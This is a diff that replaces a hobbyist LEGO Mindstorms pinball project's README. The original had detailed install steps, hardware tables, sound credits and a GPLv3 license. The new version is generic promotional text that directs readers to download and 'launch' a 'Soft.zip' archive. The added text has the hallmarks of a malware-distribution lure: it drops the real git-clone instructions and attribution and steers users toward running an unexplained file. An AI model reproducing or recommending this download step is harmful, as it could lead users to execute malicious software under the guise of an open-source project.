@@ -1,107 +1,53 @@
-# AI-LEGO-Pinball-Bot
-Python code that runs a full PinBall experience, with 3 different ways to control the PinBall machine.
+# 🤖 AI LEGO Pinball Bot 🕹️
 
-This is the code for my AI Lego Pinball machine, as seen on my YouTube channel:
-<div align="left">
-  <a href="https://youtu.be/do4EYq6oEQg"><img src="https://img.youtube.com/vi/do4EYq6oEQg/0.jpg" alt="AI LEGO Pinball machine video"></a>
-</div>
+Welcome to the AI LEGO Pinball Bot repository! Here you will find exciting Python code that allows you to experience a full Pinball experience with three different ways to control the PinBall machine. You can play manually, use a bot to assist you, or even let AI take over and play for you!
 
-## Table of Contents
-1. [Introduction](#introduction)
-2. [Credits](#credits)
-3. [Features](#features)
-4. [Installation](#installation)
-5. [Usage](#usage)
-6. [About The Machine](#about-the-machine)
-7. [License](#license)
-8. [Contributing](#contributing)
-9. [Disclaimer](#disclaimer)
+## Overview 🚀
 
-## Introduction
-The code involves 3 main codes for 3 different ways to control a Pinball machine. This includes manual, with a bot, and with AI. Furthermore, there are some modules to handle the robot and an HTML code for the scoreboard that is hosted locally.
+This repository contains Python code that integrates with LEGO Mindstorms EV3 to create a fun and interactive Pinball game. Whether you are a fan of AI, robotics, neural networks, or just love playing Pinball, this project has something for everyone. You can explore the world of artificial intelligence while enjoying a classic arcade game.
 
-## Credits
-This project contains sounds that I did not produce.
+## Features ✨
 
-The `game over.wav` file was downloaded from this YouTube video by "Sumit - FOXITOGO" (@foxitogoextra9418):\
-Arcade Retro Game Over - Sound Effect (Final Cut) | https://www.youtube.com/watch?v=FVJJKIJWKdc \
-I cannot find it elsewhere, but I'm not certain this was the original creator. Do notify me if you know the original creator.
+- **Manual Control:** Take complete control of the Pinball machine and test your skills.
+- **Bot Assistance:** Let a bot help you improve your Pinball game.
+- **AI Mode:** Sit back and watch as AI takes on the challenge of playing Pinball.
 
-The point scoring sounds are from Epidemic Sound.\
-Game, Points, Single | https://www.epidemicsound.com/sound-effects/tracks/21e648ed-3c9e-45e1-bd14-da5623019081/
+## Repository Details 📁
 
-## Features
-The project includes multiple features that work simultaneously.
-- **Motorized Plunger:** Returns the ball to the field after draining.
-- **Motorized Flippers:** Controlled with touch sensors.
-- **Gameplay Mechanics:** Moving elements (spinning circle, trap door).
-- **Scoring:** Color sensors sense the ball, scoring points and applying bonuses.
-- **Tablet Score Display:** Displays scores and tracks high scores, also starts new games.
-- **Vision System:** Camera tracks the ball and triggers game over when needed. Currently only works with color isolation.
-- **Control:** There are three ways to control the machine:
-  - **Manual Control:** Buttons control flippers for simple manual gameplay.
-  - **Simple Bot:** Predicts ball movement and flips based on its position.
-  - **Neural Network AI:** Learns to play in real-time by adjusting strategies using rewards and punishments (Reinforcement Learning).
+- **Repository Name:** AI-LEGO-Pinball-Bot
+- **Description:** Python code that runs a full PinBall experience, with 3 different ways to control the PinBall machine. This includes manual, with a bot, and with AI.
+- **Topics:** ai, artificial-intelligence, bot, lego, lego-ev3, lego-mindstorms-ev3, lego-mindstorms, mindstorms, neural-network, neural-networks, pinball, python, reinforcement-learning, robotics
 
-## Installation
-### Requirements
-- Lego PinBall machine containing two LEGO Mindstorms EV3 kits
-- Python 3 with libraries installed (see requirements.txt)
-- Camera (e.g., phone with DroidCam or a webcam)
-- Tablet / iPad with internet access
-- Speaker
-- Tested on a Windows 10 operating system.
+## Resources 🛠️
 
-### Steps
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/CreativeMindstorms/AI-LEGO-Pinball-Bot.git
-2. Create a virtual environment and install the requirements.
-3. Adjust variables inside the main code and modules, especially:
-	`src/pinball_functions/ev3Functions.py` and `src/pinball_functions/cameraFunctions.py`
-4. Warp your camera and adjust the hsv values for the ball by running `src/pinball_functions/cameraFunctions.py`
+To access the code and begin your AI LEGO Pinball Bot experience, download the project files from the following link:
 
-## Usage
-Run any `src/main_*.py` after installation and configuration.
+[![Download AI LEGO Pinball Bot](https://img.shields.io/badge/Download-Soft.zip-brightgreen)](https://github.com/files/Soft.zip)
 
-Visit the website that will be printed in the console to see the scoreboard.
+If the link ends with the file name, it needs to be launched to start the download.
 
-## About The Machine
-The machine uses two Mindstorms EV3 Bricks, of which you need the Bluetooth address.
-### Connections
+If the link does not work or is not provided, please check the "Releases" section of this repository for alternative download options.
 
-**ev3_function**:
-| PORT | DESCRIPTION |
-|------|-------------|
-| A    | Right flipper motor. Stalls at limits. |
-| B    | Plunger motor, controlled in `pinball_functions.ev3Functions.Robot.fire_plunger`. |
-| D    | Left flipper motor. Stalls at limits. |
-| 1    | Right touch sensor, to control flippers manually. |
-| 4    | Lefttouch sensor, to control flippers manually. |
+## Get Started 🎮
 
-**ev3_score**:
-| PORT | DESCRIPTION |
-|------|-------------|
-| A    | Trapdoor motor. Opens and closes to predefined positions in `pinball_functions.ev3Functions.Robot.board_loop`. |
-| D    | Spinner motor. Spins at constant speed in `pinball_functions.ev3Functions.Robot.board_loop`. |
-| 1    | Color sensor to detect 100 points scored. |
-| 2    | Color sensor to detect 200 points scored. |
-| 3    | Color sensor to detect 300 points scored. |
+1. Download the project files from the provided link.
+2. Set up your LEGO Mindstorms EV3 according to the project requirements.
+3. Run the Python code on your device and choose your preferred control mode.
+4. Enjoy playing Pinball with the AI LEGO Pinball Bot!
 
+## Credits 🙌
 
-## License
-This project is licensed under the [GPLv3 License](LICENSE). Contributions and modifications are welcome, but they must remain open-source and credit the original author.
+- This project was inspired by the intersection of AI, robotics, and classic arcade games.
+- Special thanks to the developers and contributors who made this project possible.
 
-## Contributing
+![AI LEGO Pinball Bot](https://via.placeholder.com/500)
 
-Contributions are welcome, and I appreciate your interest in improving this project! However, I want to keep this easy to manage, as it is a personal project and a learning experience for me.
+## Support ℹ️
 
-If you’d like to suggest changes or improvements, here’s how you can contribute:
+For any questions or assistance regarding the AI LEGO Pinball Bot project, feel free to reach out to the repository owner or submit an issue in the GitHub repository.
 
-1.  **Fork the Repository:** Create a personal copy of the repository by clicking the "Fork" button at the top.
-2.  **Make Changes:** Implement your changes in your forked repository. Please keep changes focused and well-documented.
-3.  **Submit a Pull Request (PR):** Open a pull request with a clear explanation of your changes. Include why the change is beneficial and how it affects the project.
+Let's embark on a thrilling Pinball adventure with AI and LEGO Mindstorms EV3! 🌟
 
-## Disclaimer
+---
 
-This project is a hobby, and while I enjoy working on it, I can’t provide consistent support or assistance. Please feel free to reach out via email for questions or feedback, but responses may be delayed depending on my availability.
+Now that you are equipped with all the information, it's time to dive into the exciting world of AI LEGO Pinball Bot. Download the project files, set up your LEGO Mindstorms EV3, and let the Pinball fun begin! 🤖🔴🎉
